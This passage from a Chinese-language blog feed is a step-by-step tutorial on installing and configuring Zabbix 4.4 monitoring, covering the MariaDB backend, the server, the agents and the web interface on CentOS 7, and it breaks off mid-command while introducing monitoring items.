class="line">gpgkey=https://mirrors.ustc.edu.cn/mariadb/yum/RPM-GPG-KEY-MariaDB </span><br><span class="line">gpgcheck=1</span><br></pre></td></tr></table></figure><p>2、yum 安装最新版本 mariadb</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# yum install MariaDB-server MariaDB-client</span><br></pre></td></tr></table></figure><p>　　首先，我们修改一下配置文件——<code>/etc/my.cnf.d/server.cnf</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# vim /etc/my.cnf.d/server.cnf</span><br><span class="line">    [mysqld]</span><br><span class="line">    skip_name_resolve = ON          #跳过主机名解析</span><br><span class="line">    innodb_file_per_table = ON      #</span><br><span class="line">    innodb_buffer_pool_size = 256M  #缓存池大小</span><br><span class="line">    max_connections = 2000          #最大连接数</span><br><span class="line"></span><br><span class="line">    log-bin = master-log            #开启二进制日志</span><br></pre></td></tr></table></figure><p>2、重启我们的数据库服务：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# systemctl restart mariadb</span><br><span class="line">[root@zabbix-master ~]# mysql_secure_installation  #初始化mariadb</span><br></pre></td></tr></table></figure><p>3、创建数据库并授权账号</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; create database zabbix character set &#x27;utf8&#x27;;  # 创建zabbix数据库</span><br><span class="line">MariaDB [(none)]&gt; grant all on zabbix.* to &#x27;zbxuser&#x27;@&#x27;192.168.19.%&#x27; identified by &#x27;keer&#x27;;# 注意授权网段</span><br><span class="line">MariaDB [(none)]&gt; flush privileges;           # 刷新授权</span><br></pre></td></tr></table></figure><p>4、<strong>导入表</strong><br>　　首先，我们来查看一下，<code>zabbix-server-mysql</code>这个包提供了什么：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# rpm -ql zabbix-server-mysql</span><br><span class="line">/etc/logrotate.d/zabbix-server</span><br><span class="line">/etc/zabbix/zabbix_server.conf</span><br><span class="line">/usr/lib/systemd/system/zabbix-server.service</span><br><span class="line">/usr/lib/tmpfiles.d/zabbix-server.conf</span><br><span class="line">/usr/lib/zabbix/alertscripts</span><br><span class="line">/usr/lib/zabbix/externalscripts</span><br><span class="line">/usr/sbin/zabbix_server_mysql</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/AUTHORS</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/COPYING</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/ChangeLog</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/NEWS</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/README</span><br><span class="line">/usr/share/doc/zabbix-server-mysql-4.4.4/create.sql.gz #生成表的sql文件</span><br><span class="line">/usr/share/man/man8/zabbix_server.8.gz</span><br><span class="line">/var/log/zabbix</span><br><span class="line">/var/run/zabbix</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　我们来使用这个文件生成我们所需要的表：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# cd /usr/share/doc/zabbix-server-mysql-4.4.4/</span><br><span class="line">[root@zabbix-master zabbix-server-mysql-4.4.4]# ls</span><br><span class="line">AUTHORS  ChangeLog  COPYING  create.sql.gz  NEWS  README</span><br><span class="line">[root@zabbix-master zabbix-server-mysql-4.4.4]# gzip -d create.sql.gz </span><br><span class="line">[root@zabbix-master zabbix-server-mysql-4.4.4]# head create.sql </span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">        `userid`                 bigint unsigned                           NOT NULL,</span><br><span class="line">        `alias`                  varchar(100)    DEFAULT &#x27;&#x27;                NOT NULL,</span><br><span class="line">        `name`                   varchar(100)    DEFAULT &#x27;&#x27;                NOT NULL,</span><br><span class="line">        `surname`                varchar(100)    DEFAULT &#x27;&#x27;                NOT NULL,</span><br><span class="line">        `passwd`                 varchar(32)     DEFAULT &#x27;&#x27;                NOT NULL,</span><br><span class="line">        `url`                    varchar(255)    DEFAULT &#x27;&#x27;                NOT NULL,</span><br><span class="line">        `autologin`              integer         DEFAULT &#x27;0&#x27;               NOT NULL,</span><br><span class="line">        `autologout`             varchar(32)     DEFAULT &#x27;15m&#x27;             NOT NULL,</span><br><span class="line">        `lang`                   varchar(5)      DEFAULT &#x27;en_GB&#x27;           NOT NULL,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们查看表头发现没有创建数据库的命令，这也正是我们刚刚手动创建数据库的原因。<br>然后，我们直接把这个表导入至我们的数据库即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master zabbix-server-mysql-4.4.4]# mysql -uzabbix -h172.16.147.153 -p zabbix &lt; create.sql</span><br><span class="line"></span><br><span class="line">Enter password:</span><br></pre></td></tr></table></figure><p>　　导入以后，我们进去数据库查看一下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# mysql -uzbxuser -h172.16.147.153 -p</span><br><span class="line">Enter password:</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| zabbix             |</span><br><span class="line">+--------------------+</span><br><span class="line">MariaDB [(none)]&gt; use zabbix;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [zabbix]&gt; show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_zabbix           |</span><br><span class="line">+----------------------------+</span><br><span class="line">| acknowledges               |</span><br><span class="line">| actions                    |</span><br><span class="line">| alerts                     |</span><br><span class="line">……</span><br><span class="line">| usrgrp                     |</span><br><span class="line">| valuemaps                  |</span><br><span class="line">+----------------------------+</span><br><span class="line">127 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>　　可以看出来，我们的数据已经导入成功了。</p><h3 id="3、配置-server-端"><a href="#3、配置-server-端" class="headerlink" title="3、配置 server 端"></a>3、配置 server 端</h3><p>　　我们的数据库准备好了以后，我们要去修改server端的配置文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# cd /etc/zabbix/</span><br><span class="line">[root@zabbix-master zabbix]# ls</span><br><span class="line">[root@zabbix-master zabbix]# ls</span><br><span class="line">web                 zabbix_java_gateway.conf         zabbix_server.conf</span><br><span class="line">zabbix_agentd.conf  zabbix_java_gateway_logback.xml</span><br><span class="line">zabbix_agentd.d     zabbix_proxy.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">为了方便我们以后恢复，我们把配置文件备份一下</span></span><br><span class="line">[root@zabbix-master zabbix]# cp zabbix_server.conf&#123;,.bak&#125;</span><br><span class="line">[root@zabbix-master zabbix]# vim zabbix_server.conf</span><br><span class="line">ListenPort=10051            #默认监听端口</span><br><span class="line">SourceIP=172.16.147.153     #发采样数据请求的IP</span><br></pre></td></tr></table></figure><p>　　为什么要设置<code>SourceIP</code>，由于我们的客户端可能一个主机多个IP，我们又不能允许任意的IP都能从我们这里读取数据，就会有一个验证方式，而该方式是基于识别SourceIP来实现的。<img src="https://img-blog.csdnimg.cn/20200331214731663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>　　日志，默认用文件记录，也可以发送给我们的rsyslog日志记录系统，如果我们选择默认，则日志存放在<code>LogFile=/var/log/zabbix/zabbix_server.log</code>中，也可以自己设置。<br><img src="https://img-blog.csdnimg.cn/20200331214807417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-UYPNI2Jj-1585662298797)(./assets/1204916-20171202111457261-900254693.png)]"><br>　　日志的滚动。默认值为1，表示滚动。我们设为0则表示不滚动。当数据特别多的时候，我们也可以设置成为1，然后在<code>Maximum size of log file in MB</code>设置当数据文件最大到多少时会自动滚动。<br><img src="https://img-blog.csdnimg.cn/20200331214827587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5nzriN0h-1585662298797)(./assets/1204916-20171202111508870-541941322.png)]"><br>　　日志的级别。一共有6个级别。我们可以根据自己的需要来设置级别。其中0表示输出最少的信息，5表示输出最详细的信息，默认值为3，设置为3的话就表示，0、1、2、3四个级别都显示。考虑到生产系统中的压力时，这里的信息，如果没有必要的话，越简单越好，只要在出错的时候，我们可以依据其进行排错即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DBHost=172.16.147.153       #数据库对外的主机</span><br><span class="line">DBName=zabbix               #数据库名称</span><br><span class="line">DBUser=zbxuser              #数据库用户</span><br><span class="line">DBPassword=keer             #数据库密码</span><br><span class="line">DBPort=3306                 #数据库启动端口</span><br></pre></td></tr></table></figure><p>　　数据库相关的设置。</p><blockquote><p>补充：我们可以使用<code>grep -i &quot;^####&quot; zabbix_server.conf</code>来查看配置文件中有哪些大段，也可以使用<code>grep -i &quot;^###&quot; zabbix_server.conf</code>来查看配置文件中每一段中的配置项有哪些</p></blockquote><p>　　以上，我们的基本配置已经完成，可以开启服务了：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master zabbix]# systemctl start zabbix-server.service</span><br></pre></td></tr></table></figure><p>　　开启服务以后，我们一定要去确认一下我们的端口有没有开启：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master zabbix]# ss -nutl |grep 10051</span><br><span class="line">tcp    LISTEN     0      128       *:10051                 *:*                  </span><br><span class="line">tcp    LISTEN     0      128      :::10051                :::*    </span><br></pre></td></tr></table></figure><p>　　如果查到的端口没有开启，我们就要去检查一下配置文件有没有出问题了。<br>　　至此，我们server端的进程启动已经ok了，接下来就可以使用web GUI来打开接口进行设定了</p><h3 id="4、配置-web-GUI"><a href="#4、配置-web-GUI" class="headerlink" title="4、配置 web GUI"></a>4、配置 web GUI</h3><p>　　我们先来查看一下，我们web GUI的配置文件在哪里：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# rpm -ql zabbix-web | less</span><br><span class="line">/etc/httpd/conf.d/zabbix.conf</span><br><span class="line">/etc/zabbix/web</span><br><span class="line">/etc/zabbix/web/maintenance.inc.php</span><br><span class="line">/etc/zabbix/web/zabbix.conf.php</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4/AUTHORS</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4/COPYING</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4/ChangeLog</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4/NEWS</span><br><span class="line">/usr/share/doc/zabbix-web-4.4.4/README</span><br><span class="line">/usr/share/zabbix</span><br><span class="line">/usr/share/zabbix/actionconf.php</span><br><span class="line">/usr/share/zabbix/adm.gui.php</span><br><span class="line">/usr/share/zabbix/adm.housekeeper.php</span><br><span class="line">/usr/share/zabbix/adm.iconmapping.php</span><br><span class="line">/usr/share/zabbix/adm.images.php</span><br><span class="line">/usr/share/zabbix/adm.macros.php</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>　　可以看出，有一个<code>/etc/httpd/conf.d/zabbix.conf</code>文件，这个配置文件就是帮我们做映射的文件，我们可以去看一看这个文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Alias /zabbix /usr/share/zabbix     #我们访问的时候要在主机后加上/zabbix来访问我们这个服务</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200331214904233.png"><br>　　时区是一定要设置的，这里被注释掉是因为，我们也可以在php的配置文件中设置时区，如果我们在php配置文件中设置时区，则对所有的php服务均有效，如果我们在zabbix.conf中设置时区，则仅对zabbix服务有效。所以，我们去php配置文件中设置我们的时区：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line">    [Date]</span><br><span class="line">    ; Defines the default timezone used by the date functions</span><br><span class="line">    ; http://php.net/date.timezone</span><br><span class="line">    date.timezone = Asia/Shanghai</span><br></pre></td></tr></table></figure><p>　　接下来，我们就可以启动我们的<code>httpd</code>服务了：<br><img src="https://img-blog.csdnimg.cn/20200331214949774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-wYG6QjWi-1585662298798)(./assets/1204916-20171202111550245-1056507466.png)]"><br>　　我们的服务已经开启，接着我们就可以用浏览器来访问了。</p><h3 id="5、浏览器访问并进行初始化设置"><a href="#5、浏览器访问并进行初始化设置" class="headerlink" title="5、浏览器访问并进行初始化设置"></a>5、浏览器访问并进行初始化设置</h3><p>　　我们使用浏览器访问<code>172.16.147.153/zabbix</code>，第一次访问时需要进行一些初始化的设置，我们按照提示操作即可：<br><img src="https://img-blog.csdnimg.cn/20200331215025912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200331215103759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200331215132768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200331215218502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200331215246787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200331215303694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Finish以后，我们就会跳转到登录页面，使用我们的账号密码登录即可：<br><img src="https://img-blog.csdnimg.cn/20200331215329957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>默认用户名为：admin ，密码为：zabbix 。<br>　　登陆进来就可以看到我们的仪表盘了：<br><img src="https://img-blog.csdnimg.cn/20200331215351988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-QdQoCUps-1585662298802)(./assets/image-20200123111024974.png)]"></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZABBIX分布式监控系统配置(二)</title>
      <link href="2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA(%E4%BA%8C)/"/>
      <url>2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>配置 agent 端</p><p>　　当我们把监控端配置启动以后，我们需要来设置一下我们的监控端，我们在被监控的主机安装好agent，设置好他的server，并把他添加到server端，就能将其纳入我们的监控系统中去了。</p><h4 id="1）安装-zabbix"><a href="#1）安装-zabbix" class="headerlink" title="1）安装 zabbix"></a>1）安装 zabbix</h4><p>　　同样的，我们先来安装zabbix。下载包，注释epel源，安装所需的包。具体步骤如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载安装官方yum源</span><br><span class="line">[root@zabbix-slave1 ~]# rpm -Uvh https://repo.zabbix.com/zabbix/4.4/rhel/7/x86_64/zabbix-release-4.4-1.el7.noarch.rpm</span><br><span class="line">[root@zabbix-slave1 ~]# yum clean all</span><br><span class="line">[root@zabbix-slave1 ~]# yum makecache fast</span><br><span class="line">已加载插件：fastestmirror</span><br><span class="line">正在清理软件源： base extras updates zabbix zabbix-non-supported</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum 下载</span></span><br><span class="line">[root@zabbix-slave1 ~]# yum install zabbix-agent zabbix-sender -y</span><br></pre></td></tr></table></figure><p>　　安装完成以后，我们去修改配置文件。</p><h4 id="2）修改配置文件"><a href="#2）修改配置文件" class="headerlink" title="2）修改配置文件"></a>2）修改配置文件</h4><p>　　一样的，我们先查一下包内有什么：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@zabbix-slave zabbix]# rpm -ql zabbix-agent</span><br><span class="line">&#x2F;etc&#x2F;logrotate.d&#x2F;zabbix-agent</span><br><span class="line">&#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf</span><br><span class="line">&#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.d</span><br><span class="line">&#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.d&#x2F;userparameter_mysql.conf</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;zabbix-agent.service</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;tmpfiles.d&#x2F;zabbix-agent.conf</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;zabbix_agentd</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4&#x2F;AUTHORS</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4&#x2F;COPYING</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4&#x2F;ChangeLog</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4&#x2F;NEWS</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-agent-4.4.4&#x2F;README</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;man&#x2F;man8&#x2F;zabbix_agentd.8.gz</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;zabbix</span><br><span class="line">&#x2F;var&#x2F;run&#x2F;zabbix</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　对配置文件做一个备份，然后去修改配置文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@zabbix-slave1 ~]# cd &#x2F;etc&#x2F;zabbix&#x2F;</span><br><span class="line">[root@zabbix-slave1 ~]# cd &#x2F;etc&#x2F;zabbix&#x2F;</span><br><span class="line">[root@zabbix-slave1 zabbix]# ls</span><br><span class="line">zabbix_agentd.conf  zabbix_agentd.d</span><br><span class="line">[root@zabbix-slave1 zabbix]# cp zabbix_agentd.conf&#123;,.bak&#125;</span><br><span class="line">[root@zabbix-slave1 zabbix]# vim zabbix_agentd.conf</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200401191847637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020040119190499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-FdPstFU7-1585739878750)(./assets/image-20200123112532726.png)]"></p><p><img src="https://img-blog.csdnimg.cn/20200401191924228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-l9CASKPn-1585739878750)(./assets/image-20200123112718258.png)]"><br>　　重点需要修改的仍然是<code>GENERAL PARAMETERS</code>段：<br><img src="https://img-blog.csdnimg.cn/20200401191945989.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-hBKTNWeP-1585739878751)(./assets/1204916-20171202111819198-1483932137.png)]"><br>　　是否允许别人执行远程操作命令，默认是禁用的，打开的话会有安全风险。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server&#x3D;172.16.147.153       #指明服务器是谁</span><br><span class="line">ListenPort&#x3D;10050            #自己监听的端口</span><br><span class="line">ListenIP&#x3D;0.0.0.0            #自己监听的地址，0.0.0.0表示本机所有地址</span><br><span class="line">StartAgents&#x3D;3               #优化时使用的</span><br><span class="line"></span><br><span class="line">ServerActive&#x3D;172.16.147.153 #主动监控时的服务器</span><br><span class="line">Hostname&#x3D;node1.keer.com     #自己能被server端识别的名称</span><br></pre></td></tr></table></figure><p>　　修改完成之后，我们保存退出。然后就可以启动服务了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@zabbix-slave1 zabbix]# systemctl start zabbix-agent.service</span><br></pre></td></tr></table></figure><p>　　照例查看端口是否已开启</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@zabbix-slave1 zabbix]# ss -ntul |grep 10050</span><br><span class="line">tcp    LISTEN     0      128       *:10050                 *:*  </span><br></pre></td></tr></table></figure><p>已经开启成功。接着，我们就可以去server端添加了。<br>　　node2也进行同样的操作，唯一不同的就是配置文件中的<code>Hostname</code>要设为<code>node2.keer.com</code>。</p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZABBIX分布式监控系统配置(三)</title>
      <link href="2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE(%E4%B8%89)/"/>
      <url>2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<p>监控过程详解</p><h4 id="1）修改密码及中文版"><a href="#1）修改密码及中文版" class="headerlink" title="1）修改密码及中文版"></a>1）修改密码及中文版</h4><p>　   这里强调一下，把系统语言改为中文，不是英文不够好，主要是母语亲切，呵呵。<br><img src="https://img-blog.csdnimg.cn/20200402133420198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　按如上操作即可，选择中文以后，点击下面的update即可更新成功，更新过后是这样婶儿的~<br><img src="https://img-blog.csdnimg.cn/20200402133450122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="image-20200123114827297"><br>　　同样的，为了安全起见，我们把密码改掉：<br><img src="https://img-blog.csdnimg.cn/20200402133511968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123115010193.png"><br>修改完成后同样点击更新即可。</p><h4 id="2）创建主机及主机群组"><a href="#2）创建主机及主机群组" class="headerlink" title="2）创建主机及主机群组"></a>2）创建主机及主机群组</h4><p>　　我们先来定义一个主机群组：<br><img src="https://img-blog.csdnimg.cn/20200402133542673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123115128270.png"><br><img src="https://img-blog.csdnimg.cn/20200402133558799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123115247517.png"><br>　　然后我们就可以去添加主机了：<br><img src="https://img-blog.csdnimg.cn/20200402133616631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123115825323.png"></p><p>　　当然，上面有很多选择卡，有一个加密：<br><img src="https://img-blog.csdnimg.cn/20200402133642209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123120041952.png"><br>　　设置完成后，点击添加。我们就可以看到，我们添加的这个主机已经出现在列表中了：</p><p><img src="https://img-blog.csdnimg.cn/2020040213370939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　同样的，我们把node2节点也添加进来：<br><img src="https://img-blog.csdnimg.cn/20200402133723795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123123432103.png"></p><h4 id="3）监控项-items"><a href="#3）监控项-items" class="headerlink" title="3）监控项(items)"></a>3）监控项(items)</h4><h5 id="①-介绍"><a href="#①-介绍" class="headerlink" title="① 介绍"></a>① 介绍</h5><p>　　我们点击上图中slave1的监控项，即可创建我们的监控项，首先，我们创建三个应用集：</p><p><img src="https://img-blog.csdnimg.cn/2020040213374427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　然后我们来定义监控项：</p><p><img src="https://img-blog.csdnimg.cn/20200402133759714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200402133816388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="20200123124053734.png"></p><blockquote><p>　　任何一个被监控项，如果想要能够被监控，一定要在zabbix-server端定义了能够连接至zabbix-agent端，并且能够获取命令。或者在agent端定义了能够让server端获取命令。一般都是内建的命令，都对应的有其名字，被我们称之为<code>key</code>。<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-sB8s1AhH-1585805581972)(./assets/image-20200123124531059.png)]<br>关于key值，我们可以直接在网页上设置(服务器自动执行)，也可以使用命令行命令(手动执行)来获取：</p><blockquote><p><code>[root@zabbix-master ~]# zabbix_get -s 172.16.147.154 -p 10050 -k 